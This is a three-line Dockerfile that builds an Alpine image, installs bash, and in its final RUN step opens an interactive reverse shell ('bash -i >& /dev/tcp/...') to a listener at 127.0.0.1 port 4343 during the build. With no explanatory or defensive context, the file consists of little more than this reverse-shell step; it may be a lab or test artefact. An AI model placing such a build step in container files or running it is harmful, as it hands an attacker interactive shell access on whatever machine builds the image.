FROM alpine
RUN apk update && apk add bash
RUN /bin/bash  -c 'bash -i >& /dev/tcp/127.0.0.1/4343 0>&1'
